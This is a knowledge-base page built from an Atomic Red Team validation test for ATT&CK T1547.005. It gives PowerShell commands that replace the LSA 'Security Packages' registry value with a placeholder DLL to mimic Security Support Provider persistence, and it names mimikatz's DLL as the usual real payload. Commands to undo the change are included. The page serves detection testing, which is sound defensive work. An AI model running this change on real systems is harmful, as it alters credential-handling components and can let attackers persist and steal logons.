---
atomic_guid: "afdfd7e3-8a0b-409f-85f7-886fdf249c9e"
title: "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.005"
attack_technique_name: "Boot or Logon Autostart Execution: Security Support Provider"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.005/T1547.005.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "afdfd7e3-8a0b-409f-85f7-886fdf249c9e"
  - "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry

Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.
A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/

## Metadata

- Atomic GUID: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
- Technique: T1547.005: Boot or Logon Autostart Execution: Security Support Provider
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1547.005/T1547.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.005]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";
$newvalue = "AtomicTest.dll";
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
```

### Cleanup

```powershell
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value "$oldvalue";
Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.005/T1547.005.yaml)
